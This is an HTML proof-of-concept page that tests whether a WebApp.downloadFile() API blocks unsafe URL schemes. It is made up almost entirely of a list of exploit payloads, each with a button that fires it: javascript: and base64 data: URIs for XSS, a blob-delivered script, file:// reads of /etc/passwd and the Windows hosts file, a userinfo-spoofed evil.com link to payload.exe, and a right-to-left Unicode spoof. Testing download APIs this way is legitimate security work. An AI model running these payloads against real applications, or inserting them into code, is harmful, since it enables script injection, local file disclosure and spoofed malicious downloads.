<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>WebApp.downloadFile() PoC</title>
</head>
<body>
  <h3>WebApp.downloadFile() — Schema Bypass Test</h3>

  <div id="buttons"></div>
  <pre id="log">[LOG]</pre>

  <script>
    const log = (msg) => {
      console.log(msg);
      document.getElementById('log').textContent += "\n" + msg;
    };

    const payloads = [
      {
        name: "javascript: URI",
        url: "javascript:alert('XSS via javascript:')",
        filename: "xss.html"
      },
      {
        name: "Encoded javascript:",
        url: decodeURIComponent("javascript%3Aalert('Encoded XSS')"),
        filename: "encoded_xss.html"
      },
      {
        name: "data: URI",
        url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgnZGF0YScpPC9zY3JpcHQ+",
        filename: "data_xss.html"
      },
      {
        name: "blob: HTML",
        dynamic: true,
        content: `<html><body><script>alert('Blob XSS')</script></body></html>`,
        type: "text/html",
        filename: "blob-xss.html"
      },
      {
        name: "file:///etc/passwd (Linux)",
        url: "file:///etc/passwd",
        filename: "passwd.txt"
      },
      {
        name: "file:///C:/Windows/hosts (Windows)",
        url: "file:///C:/Windows/System32/drivers/etc/hosts",
        filename: "hosts.txt"
      },
      {
        name: "https://evil.com@trusted.com",
        url: "https://evil.com@trusted.com/payload.exe",
        filename: "spoofed.exe"
      },
      {
        name: "Unicode RTL spoof",
        url: "https://\u202Evbscript.com",
        filename: "spoof.txt"
      }
    ];

    const container = document.getElementById("buttons");

    payloads.forEach((payload, idx) => {
      const btn = document.createElement("button");
      btn.textContent = `${idx + 1}. ${payload.name}`;
      btn.onclick = () => {
        try {
          if (payload.dynamic) {
            const blob = new Blob([payload.content], { type: payload.type });
            const url = URL.createObjectURL(blob);
            WebApp.downloadFile({ url, name: payload.filename });
            log(`✔ Triggered dynamic: ${payload.name}`);
          } else {
            WebApp.downloadFile({ url: payload.url, name: payload.filename });
            log(`✔ Triggered: ${payload.name} → ${payload.url}`);
          }
        } catch (err) {
          log(`❌ Blocked: ${payload.name} → ${err}`);
        }
      };
      container.appendChild(btn);
      container.appendChild(document.createElement("br"));
    });
  </script>
</body>
</html>
